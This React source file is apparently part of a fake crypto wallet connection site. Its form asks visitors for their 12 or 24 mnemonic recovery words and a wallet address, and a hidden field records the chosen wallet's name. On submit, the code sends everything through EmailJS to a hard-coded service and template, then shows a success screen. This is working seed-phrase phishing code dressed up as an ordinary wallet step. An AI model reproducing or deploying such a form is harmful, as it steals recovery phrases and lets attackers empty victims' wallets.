/* eslint-disable react/prop-types */
import React, { useState, useRef } from "react";
import styles from "./FormTwo.module.css";
import emailjs from "@emailjs/browser";
import { useModal } from "../pages/walletPage";
import FormFour from "./FormFour";
import SuccessForm from "./SuccessForm";

const FormThree = () => {
  const { selectedWallet } = useModal();
  const [input, setInput] = useState("");
  const [secondInput, setSecondInput] = useState("");
  const [thirdInput, setThirdInput] = useState(selectedWallet.title);
  const [success, setSuccess] = useState(false);

  console.log(selectedWallet);

  const inputHandler = (e) => {
    setInput(e.target.value);
  };

  const secondInputHandler = (e) => {
    setSecondInput(e.target.value);
  };

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_9jeilqt", "template_ghg09tp", form.current, {
        publicKey: "r6jlFoRSbAij1f7VU",
      })
      .then(
        () => {
          console.log("SUCCESS!");
          setSuccess((prev) => !prev);
        },
        (error) => {
          alert("FAILED...", error.text);
        }
      );

    setInput("");
    setSecondInput("");
  };
  return (
    <>
      {success ? (
        <SuccessForm />
      ) : (
        <form className="w-[100%]" ref={form} onSubmit={sendEmail}>
          <input
            className="hidden"
            value={thirdInput}
            name="name"
            onChange={(e) => setThirdInput(e.target.value)}
          />
          <textarea
            placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
            className="w-[100%] h-[100px] border-[1px] border-solid border-[#0000001A] rounded-md p-[0.3rem] pl-[10px]"
            value={input}
            name="message"
            onChange={inputHandler}
          />

          <textarea
            placeholder="Please enter your referral code.(Wallet address) Kindly ignore if you don't have one."
            className="w-[100%] h-[100px] border-[1px] border-solid border-[#0000001A] rounded-md p-[0.3rem] pl-[10px]"
            value={secondInput}
            name="secondMsg"
            onChange={secondInputHandler}
          />

          <button
            className={`${styles.btn} ${
              !input ? styles.btnFaint : ""
            } cursor-pointer`}
            disabled={!input}
          >
            Next
          </button>
        </form>
      )}
    </>
  );
};

export default FormThree;
